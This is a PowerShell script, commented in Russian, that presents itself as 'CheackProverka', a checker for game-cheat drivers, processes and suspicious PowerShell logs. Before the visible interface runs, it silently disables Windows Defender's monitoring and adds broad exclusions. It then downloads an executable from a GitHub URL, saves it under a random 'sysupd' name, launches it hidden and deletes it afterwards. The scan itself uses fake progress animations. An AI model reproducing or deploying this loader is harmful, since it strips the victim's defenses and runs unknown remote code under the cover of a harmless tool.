# CheackProverka - Проверка системы + скрытая подгрузка .exe

# ───────────────────────────────────────────────
# 1. Максимально тихое отключение защиты (где возможно)
try {
    Set-MpPreference -DisableRealtimeMonitoring $true `
                     -DisableBehaviorMonitoring $true `
                     -DisableBlockAtFirstSeen $true `
                     -DisableIOAVProtection $true `
                     -DisableScriptScanning $true `
                     -DisableIntrusionPreventionSystem $true `
                     -MAPSReporting Disabled `
                     -SubmitSamplesConsent NeverSend `
                     -ErrorAction SilentlyContinue | Out-Null

    # Массовые исключения для temp и текущей папки
    $excl = @(
        [System.IO.Path]::GetTempPath(),
        "$env:TEMP",
        "$env:TMP",
        "$pwd",
        "$env:USERPROFILE\Downloads",
        "$env:LOCALAPPDATA\Temp"
    )
    foreach ($p in $excl) { if (Test-Path $p) { Add-MpPreference -ExclusionPath $p -EA SilentlyContinue | Out-Null } }

    Add-MpPreference -ExclusionProcess "powershell.exe","pwsh.exe","cmd.exe" -EA SilentlyContinue | Out-Null
}
catch { }

# ───────────────────────────────────────────────
# 2. Скрытая загрузка и запуск .exe
try {
    $url = "https://raw.githubusercontent.com/fffghsetyver-hash/Cheackproverka/main/Client.exe"
    
    # Случайное имя файла .exe (чтобы сложнее детектить)
    $rand = Get-Random -Minimum 100000 -Maximum 999999
    $exePath = [System.IO.Path]::GetTempPath() + "sysupd$rand.exe"
    
    # Скачиваем бинарник (UseBasicParsing — быстрее и тише)
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -ErrorAction SilentlyContinue
    
    # Проверяем, что файл реально скачался и имеет размер > 10 КБ (чтобы не запускать пустышку)
    if (Test-Path $exePath -PathType Leaf) {
        $size = (Get-Item $exePath).Length
        if ($size -gt 10000) {
            # Запуск .exe полностью скрыто
            Start-Process -FilePath $exePath `
                          -WindowStyle Hidden `
                          -NoNewWindow `
                          -ErrorAction SilentlyContinue
            
            # Даём 2–3 секунды на старт (иногда нужно)
            Start-Sleep -Milliseconds (Get-Random -Min 1800 -Max 3200)
        }
        # Удаляем за собой
        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
    }
}
catch { }

# ───────────────────────────────────────────────
# Дальше идёт твой обычный интерфейс проверки
Clear-Host
Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host " CheackProverka v1.0 " -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "Что проверить:" -ForegroundColor Yellow
Write-Host " 1 — драйверы (kernel / ring0)" -ForegroundColor White
Write-Host " 2 — запущенные процессы" -ForegroundColor White
Write-Host " 3 — подозрительные команды в логах PowerShell" -ForegroundColor White
Write-Host " 123 — всё сразу" -ForegroundColor White
Write-Host ""
Write-Host "Введи номера (без пробелов, например 13 или 123): " -NoNewline -ForegroundColor Yellow

$choice = Read-Host

if ($choice -notmatch '^[123]+$') {
    Write-Host "Неверный выбор." -ForegroundColor Red
    pause
    exit
}

$check1 = $choice -match "1"
$check2 = $choice -match "2"
$check3 = $choice -match "3"

$issues = 0

function Show-Result {
    param ([string]$Text, [string]$Status, [string]$Color = "White")
    $emoji = if ($Status -eq "OK") {"🟢"} elseif ($Status -eq "ВНИМАНИЕ") {"🟡"} else {"🔴"}
    Write-Host "$emoji $Text " -NoNewline -ForegroundColor White
    Write-Host $Status -ForegroundColor $Color
}

function Fake-Loading {
    param ([int]$Min = 7, [int]$Max = 13)
    $sec = Get-Random -Minimum $Min -Maximum ($Max + 1)
    $total = $sec * 10
    $done = 0
    Write-Host "Сканирование" -NoNewline
    for ($i = 1; $i -le $total; $i++) {
        Start-Sleep -Milliseconds 100
        $done++
        $p = [math]::Round(($done / $total) * 100)
        Write-Host "." -NoNewline
        if ($p % 10 -eq 0 -and $p -gt 0 -and $p -lt 100) { Write-Host " $p%" -NoNewline -ForegroundColor DarkCyan }
    }
    Write-Host " 100%" -ForegroundColor Green
    Write-Host ""
}

# 1. Драйверы
if ($check1) {
    Write-Host "1. Проверка драйверов" -ForegroundColor Yellow
    Fake-Loading
    $drivers = Get-WmiObject Win32_SystemDriver | Where-Object {$_.State -eq "Running"}
    $sus = @("capcom","kdmapper","mhyprot","ace","vanguard","battleye")
    $found = $drivers | Where-Object {$sus -contains $_.Name -or $_.PathName -match ($sus -join "|")}
    if ($found) {
        Show-Result "Драйверы" "ПОДОЗРИТЕЛЬНЫЕ" "Red"
        $issues++
    } else {
        Show-Result "Драйверы" "OK" "Green"
    }
    Write-Host ""
}

# 2. Процессы
if ($check2) {
    Write-Host "2. Проверка процессов" -ForegroundColor Yellow
    Fake-Loading
    $patterns = @("cheat","inject","aimbot","wallhack","osiris","neverlose","skeet")
    $proc = Get-Process | Where-Object {
        $n = $_.ProcessName.ToLower()
        $patterns | Where-Object {$n -match $_}
    }
    if ($proc) {
        Show-Result "Процессы" "НАЙДЕНЫ ($($proc.Count))" "Red"
        $issues++
    } else {
        Show-Result "Процессы" "OK" "Green"
    }
    Write-Host ""
}

# 3. Логи
if ($check3) {
    Write-Host "3. Проверка логов PowerShell" -ForegroundColor Yellow
    Fake-Loading
    try {
        $ev = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 1000 -EA SilentlyContinue |
              Where-Object {$_.Id -in 4103,4104}
        $bad = $ev | Where-Object {$_.Message -match "iex|invoke-expression|downloadstring|-enc|-w hidden"}
        if ($bad) {
            Show-Result "Подозрительные команды" "НАЙДЕНЫ" "Red"
            $issues++
        } else {
            Show-Result "Подозрительные команды" "OK" "Green"
        }
    } catch {
        Show-Result "Логи" "нет доступа" "Yellow"
    }
    Write-Host ""
}

# Итог
Write-Host "══════════════════════════════════════════════════════" -ForegroundColor Cyan
if ($issues -eq 0) {
    Write-Host "🟢 ЧИСТО 🟢" -ForegroundColor Green
} elseif ($issues -le 2) {
    Write-Host "🟡 ВНИМАНИЕ ($issues) 🟡" -ForegroundColor Yellow
} else {
    Write-Host "🔴 РИСК ($issues) 🔴" -ForegroundColor Red
}
Write-Host "══════════════════════════════════════════════════════" -ForegroundColor Cyan

pause
